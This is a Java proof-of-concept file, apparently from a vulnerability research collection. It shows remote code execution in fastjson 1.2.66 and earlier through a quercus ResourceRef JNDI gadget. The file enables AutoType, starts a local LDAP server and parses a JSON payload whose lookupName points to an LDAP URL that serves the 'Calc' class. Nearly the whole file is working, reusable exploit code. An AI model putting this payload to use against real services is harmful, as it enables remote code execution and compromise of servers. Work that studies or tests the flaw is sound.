package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;

/**
 * fastjson <= 1.2.66 RCE，需要开启AutoType & JSON.parseObject
 *
 *
 * quercus ResourceRef jndi gadget
 *
 * <dependency>
 *       <groupId>com.caucho</groupId>
 *       <artifactId>quercus</artifactId>
 *       <version>4.0.63</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class QuercusPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:43658/Calc\"}";//ldap方式
    JSON.parseObject(payload);
  }
}
